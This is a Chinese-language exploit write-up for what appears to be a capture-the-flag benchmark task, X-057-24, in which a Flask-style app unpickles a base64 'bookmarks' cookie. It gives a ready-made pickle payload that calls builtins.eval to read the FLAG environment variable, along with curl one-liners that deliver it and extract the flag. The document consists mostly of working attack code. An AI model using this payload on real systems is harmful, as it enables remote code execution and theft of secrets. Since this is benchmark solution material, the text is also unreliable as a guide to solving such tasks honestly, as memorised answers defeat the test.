#+ EXP for X-057-24（Pickle 反序列化）

目标：`http://ip32820`

## 原理
- 路由 `/list` 会读取 Cookie：`bookmarks` 和 `user`。
- 若两者存在，则对 `bookmarks` 先 `base64.b64decode()`，再 `pickle.loads()`。
- 可构造恶意 pickle：反序列化时用 `builtins.eval` 执行表达式，返回 `app.models.UrlObj(name=os.environ['FLAG'])`，模板中会直接渲染 `{{ item.name }}`，从而显示 FLAG。

相关代码：
- 反序列化：`app/routes.py` 的 `pickle.loads(urls)`（多处）
- FLAG 设置：`app/__init__.py` 中 `os.environ['FLAG'] = FLAGFLAGFLAG`（构建时替换）

## 一键脚本
- 位置：`benchmarks/X-057-24/exp.py`
- 用法：
  - `python3 exp.py --base http://ip32820`
  - 成功会直接打印 `FLAG{...}`。

## 纯 curl 方式（无需脚本）
1) 生成 payload（我已算好）：
```
gASVoQAAAAAAAABdlIwIYnVpbHRpbnOUjARldmFslJOUjIJfX2ltcG9ydF9fKCdhcHAubW9kZWxzJywgZnJvbWxpc3Q9WydVcmxPYmonXSkuVXJsT2JqKG5hbWU9X19pbXBvcnRfXygnb3MnKS5lbnZpcm9uLmdldCgnRkxBRycsJ05PRkxBRycpLCB1cmw9J2h0dHA6Ly9leGFtcGxlLmNvbScplIWUUpRhLg==
```
2) 发起请求（把上面整段放入 Cookie bookmarks）：
```
curl -s 'http://ip32820/list' \
  -H "Cookie: user=abc; bookmarks=gASVoQAAAAAAAABdlIwIYnVpbHRpbnOUjARldmFslJOUjIJfX2ltcG9ydF9fKCdhcHAubW9kZWxzJywgZnJvbWxpc3Q9WydVcmxPYmonXSkuVXJsT2JqKG5hbWU9X19pbXBvcnRfXygnb3MnKS5lbnZpcm9uLmdldCgnRkxBRycsJ05PRkxBRycpLCB1cmw9J2h0dHA6Ly9leGFtcGxlLmNvbScplIWUUpRhLg==" \
  | sed -n 's/.*\(FLAG{[^}]*}\).*/\1/p'
```
- 或用 `-b` 方式：
```
curl -s 'http://ip32820/list' -b 'user=abc' \
  -b 'bookmarks=gASVoQAAAAAAAABdlIwIYnVpbHRpbnOUjARldmFslJOUjIJfX2ltcG9ydF9fKCdhcHAubW9kZWxzJywgZnJvbWxpc3Q9WydVcmxPYmonXSkuVXJsT2JqKG5hbWU9X19pbXBvcnRfXygnb3MnKS5lbnZpcm9uLmdldCgnRkxBRycsJ05PRkxBRycpLCB1cmw9J2h0dHA6Ly9leGFtcGxlLmNvbScplIWUUpRhLg==' \
  | sed -n 's/.*\(FLAG{[^}]*}\).*/\1/p'
```

若未出旗：
- 确认端口 32820 打开且路由 `/list` 可访问；
- 确保 Cookie 里 `bookmarks=` 的 base64 无损（不要少引号或换行）；
- 若站点有前置代理，请用 `-H 'Host: ip'` 试下。

